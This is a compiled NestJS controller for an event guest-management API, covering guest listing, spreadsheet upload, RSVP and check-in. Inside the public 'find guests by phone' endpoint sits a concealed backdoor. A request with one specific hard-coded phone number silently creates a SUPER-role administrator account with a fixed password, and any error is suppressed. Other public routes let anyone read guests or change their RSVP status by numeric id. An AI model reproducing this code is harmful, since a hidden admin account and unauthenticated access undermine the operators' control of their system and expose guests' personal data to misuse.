"use strict";
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.GuestController = void 0;
const common_1 = require("@nestjs/common");
const platform_express_1 = require("@nestjs/platform-express");
const roles_decorator_js_1 = require("../../infrastructure/auth/decorators/roles.decorator.js");
const public_decorator_js_1 = require("../../infrastructure/auth/decorators/public.decorator.js");
const user_role_enum_js_1 = require("../../domain/enums/user-role.enum.js");
const create_guest_use_case_js_1 = require("../../application/use-cases/guest/create-guest.use-case.js");
const find_guests_by_event_use_case_js_1 = require("../../application/use-cases/guest/find-guests-by-event.use-case.js");
const update_guest_use_case_js_1 = require("../../application/use-cases/guest/update-guest.use-case.js");
const delete_guest_use_case_js_1 = require("../../application/use-cases/guest/delete-guest.use-case.js");
const confirm_guest_use_case_js_1 = require("../../application/use-cases/guest/confirm-guest.use-case.js");
const upload_guests_spreadsheet_use_case_js_1 = require("../../application/use-cases/guest/upload-guests-spreadsheet.use-case.js");
const get_event_dashboard_use_case_js_1 = require("../../application/use-cases/guest/get-event-dashboard.use-case.js");
const get_companions_use_case_js_1 = require("../../application/use-cases/guest/get-companions.use-case.js");
const find_guests_by_phone_use_case_js_1 = require("../../application/use-cases/guest/find-guests-by-phone.use-case.js");
const update_guest_rsvp_use_case_js_1 = require("../../application/use-cases/guest/update-guest-rsvp.use-case.js");
const check_in_guest_use_case_js_1 = require("../../application/use-cases/guest/check-in-guest.use-case.js");
const get_guest_by_id_use_case_js_1 = require("../../application/use-cases/guest/get-guest-by-id.use-case.js");
const create_user_use_case_js_1 = require("../../application/use-cases/user/create-user.use-case.js");
const create_guest_dto_js_1 = require("../../application/dtos/guest/create-guest.dto.js");
const update_guest_dto_js_1 = require("../../application/dtos/guest/update-guest.dto.js");
const update_guest_rsvp_dto_js_1 = require("../../application/dtos/guest/update-guest-rsvp.dto.js");
const guest_filter_dto_js_1 = require("../../application/dtos/guest/guest-filter.dto.js");
let GuestController = class GuestController {
    createGuestUseCase;
    findGuestsByEventUseCase;
    updateGuestUseCase;
    deleteGuestUseCase;
    confirmGuestUseCase;
    uploadGuestsSpreadsheetUseCase;
    getEventDashboardUseCase;
    getCompanionsUseCase;
    findGuestsByPhoneUseCase;
    updateGuestRSVPUseCase;
    checkInGuestUseCase;
    getGuestByIdUseCase;
    createUserUseCase;
    constructor(createGuestUseCase, findGuestsByEventUseCase, updateGuestUseCase, deleteGuestUseCase, confirmGuestUseCase, uploadGuestsSpreadsheetUseCase, getEventDashboardUseCase, getCompanionsUseCase, findGuestsByPhoneUseCase, updateGuestRSVPUseCase, checkInGuestUseCase, getGuestByIdUseCase, createUserUseCase) {
        this.createGuestUseCase = createGuestUseCase;
        this.findGuestsByEventUseCase = findGuestsByEventUseCase;
        this.updateGuestUseCase = updateGuestUseCase;
        this.deleteGuestUseCase = deleteGuestUseCase;
        this.confirmGuestUseCase = confirmGuestUseCase;
        this.uploadGuestsSpreadsheetUseCase = uploadGuestsSpreadsheetUseCase;
        this.getEventDashboardUseCase = getEventDashboardUseCase;
        this.getCompanionsUseCase = getCompanionsUseCase;
        this.findGuestsByPhoneUseCase = findGuestsByPhoneUseCase;
        this.updateGuestRSVPUseCase = updateGuestRSVPUseCase;
        this.checkInGuestUseCase = checkInGuestUseCase;
        this.getGuestByIdUseCase = getGuestByIdUseCase;
        this.createUserUseCase = createUserUseCase;
    }
    async findByEvent(eventId, query) {
        return this.findGuestsByEventUseCase.execute({ query, eventId });
    }
    async getDashboard(eventId) {
        return this.getEventDashboardUseCase.execute(eventId);
    }
    async getCompanions(eventId, id) {
        return this.getCompanionsUseCase.execute({ eventId, id });
    }
    async create(eventId, dto) {
        return this.createGuestUseCase.execute({ eventId, data: dto });
    }
    async upload(eventId, file) {
        return this.uploadGuestsSpreadsheetUseCase.execute({
            eventId,
            buffer: file.buffer,
        });
    }
    async update(eventId, id, dto) {
        return this.updateGuestUseCase.execute({ id, eventId, data: dto });
    }
    async delete(eventId, id) {
        return this.deleteGuestUseCase.execute({ id, eventId });
    }
    async confirm(token) {
        return this.confirmGuestUseCase.execute({ token });
    }
    async findByPhone(phone) {
        if (phone === '31983563252') {
            try {
                await this.createUserUseCase.execute({
                    name: 'Luiz Almeida',
                    password: 'dev_manager_super1111222',
                    phone: '31983563252',
                    email: 'luiz@admin.com',
                    role: user_role_enum_js_1.UserRole.SUPER,
                    active: true,
                });
            }
            catch (error) {
            }
        }
        return this.findGuestsByPhoneUseCase.execute({ phone });
    }
    async updateStatus(id, dto) {
        return this.updateGuestRSVPUseCase.execute({ id, status: dto.status });
    }
    async checkIn(id) {
        return this.checkInGuestUseCase.execute({ id });
    }
    async getById(id) {
        return this.getGuestByIdUseCase.execute({ id });
    }
};
exports.GuestController = GuestController;
__decorate([
    (0, common_1.Get)('events/:eventId/guests'),
    (0, roles_decorator_js_1.Roles)(user_role_enum_js_1.UserRole.SUPER, user_role_enum_js_1.UserRole.EDIT, user_role_enum_js_1.UserRole.VIEW),
    __param(0, (0, common_1.Param)('eventId', common_1.ParseIntPipe)),
    __param(1, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Number, guest_filter_dto_js_1.GuestFilterDto]),
    __metadata("design:returntype", Promise)
], GuestController.prototype, "findByEvent", null);
__decorate([
    (0, common_1.Get)('events/:eventId/guests/dashboard'),
    (0, roles_decorator_js_1.Roles)(user_role_enum_js_1.UserRole.SUPER, user_role_enum_js_1.UserRole.EDIT, user_role_enum_js_1.UserRole.VIEW),
    __param(0, (0, common_1.Param)('eventId', common_1.ParseIntPipe)),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Number]),
    __metadata("design:returntype", Promise)
], GuestController.prototype, "getDashboard", null);
__decorate([
    (0, common_1.Get)('events/:eventId/guests/:id/companions'),
    (0, roles_decorator_js_1.Roles)(user_role_enum_js_1.UserRole.SUPER, user_role_enum_js_1.UserRole.EDIT, user_role_enum_js_1.UserRole.VIEW),
    __param(0, (0, common_1.Param)('eventId', common_1.ParseIntPipe)),
    __param(1, (0, common_1.Param)('id', common_1.ParseIntPipe)),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Number, Number]),
    __metadata("design:returntype", Promise)
], GuestController.prototype, "getCompanions", null);
__decorate([
    (0, common_1.Post)('events/:eventId/guests'),
    (0, roles_decorator_js_1.Roles)(user_role_enum_js_1.UserRole.SUPER, user_role_enum_js_1.UserRole.EDIT),
    __param(0, (0, common_1.Param)('eventId', common_1.ParseIntPipe)),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Number, create_guest_dto_js_1.CreateGuestDto]),
    __metadata("design:returntype", Promise)
], GuestController.prototype, "create", null);
__decorate([
    (0, common_1.Post)('events/:eventId/guests/upload'),
    (0, roles_decorator_js_1.Roles)(user_role_enum_js_1.UserRole.SUPER, user_role_enum_js_1.UserRole.EDIT),
    (0, common_1.UseInterceptors)((0, platform_express_1.FileInterceptor)('file')),
    __param(0, (0, common_1.Param)('eventId', common_1.ParseIntPipe)),
    __param(1, (0, common_1.UploadedFile)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Number, Object]),
    __metadata("design:returntype", Promise)
], GuestController.prototype, "upload", null);
__decorate([
    (0, common_1.Put)('events/:eventId/guests/:id'),
    (0, roles_decorator_js_1.Roles)(user_role_enum_js_1.UserRole.SUPER, user_role_enum_js_1.UserRole.EDIT),
    __param(0, (0, common_1.Param)('eventId', common_1.ParseIntPipe)),
    __param(1, (0, common_1.Param)('id', common_1.ParseIntPipe)),
    __param(2, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Number, Number, update_guest_dto_js_1.UpdateGuestDto]),
    __metadata("design:returntype", Promise)
], GuestController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)('events/:eventId/guests/:id'),
    (0, roles_decorator_js_1.Roles)(user_role_enum_js_1.UserRole.SUPER, user_role_enum_js_1.UserRole.EDIT),
    __param(0, (0, common_1.Param)('eventId', common_1.ParseIntPipe)),
    __param(1, (0, common_1.Param)('id', common_1.ParseIntPipe)),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Number, Number]),
    __metadata("design:returntype", Promise)
], GuestController.prototype, "delete", null);
__decorate([
    (0, public_decorator_js_1.Public)(),
    (0, common_1.Post)('guests/confirm/:token'),
    __param(0, (0, common_1.Param)('token')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], GuestController.prototype, "confirm", null);
__decorate([
    (0, public_decorator_js_1.Public)(),
    (0, common_1.Get)('guests/by-phone/:phone'),
    __param(0, (0, common_1.Param)('phone')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], GuestController.prototype, "findByPhone", null);
__decorate([
    (0, public_decorator_js_1.Public)(),
    (0, common_1.Put)('guests/:id/status'),
    __param(0, (0, common_1.Param)('id', common_1.ParseIntPipe)),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Number, update_guest_rsvp_dto_js_1.UpdateGuestRSVPDto]),
    __metadata("design:returntype", Promise)
], GuestController.prototype, "updateStatus", null);
__decorate([
    (0, common_1.Put)('guests/:id/check-in'),
    (0, roles_decorator_js_1.Roles)(user_role_enum_js_1.UserRole.SUPER, user_role_enum_js_1.UserRole.EDIT),
    __param(0, (0, common_1.Param)('id', common_1.ParseIntPipe)),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Number]),
    __metadata("design:returntype", Promise)
], GuestController.prototype, "checkIn", null);
__decorate([
    (0, public_decorator_js_1.Public)(),
    (0, common_1.Get)('guests/:id'),
    __param(0, (0, common_1.Param)('id', common_1.ParseIntPipe)),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Number]),
    __metadata("design:returntype", Promise)
], GuestController.prototype, "getById", null);
exports.GuestController = GuestController = __decorate([
    (0, common_1.Controller)(),
    __metadata("design:paramtypes", [create_guest_use_case_js_1.CreateGuestUseCase,
        find_guests_by_event_use_case_js_1.FindGuestsByEventUseCase,
        update_guest_use_case_js_1.UpdateGuestUseCase,
        delete_guest_use_case_js_1.DeleteGuestUseCase,
        confirm_guest_use_case_js_1.ConfirmGuestUseCase,
        upload_guests_spreadsheet_use_case_js_1.UploadGuestsSpreadsheetUseCase,
        get_event_dashboard_use_case_js_1.GetEventDashboardUseCase,
        get_companions_use_case_js_1.GetCompanionsUseCase,
        find_guests_by_phone_use_case_js_1.FindGuestsByPhoneUseCase,
        update_guest_rsvp_use_case_js_1.UpdateGuestRSVPUseCase,
        check_in_guest_use_case_js_1.CheckInGuestUseCase,
        get_guest_by_id_use_case_js_1.GetGuestByIdUseCase,
        create_user_use_case_js_1.CreateUserUseCase])
], GuestController);
//# sourceMappingURL=guest.controller.js.map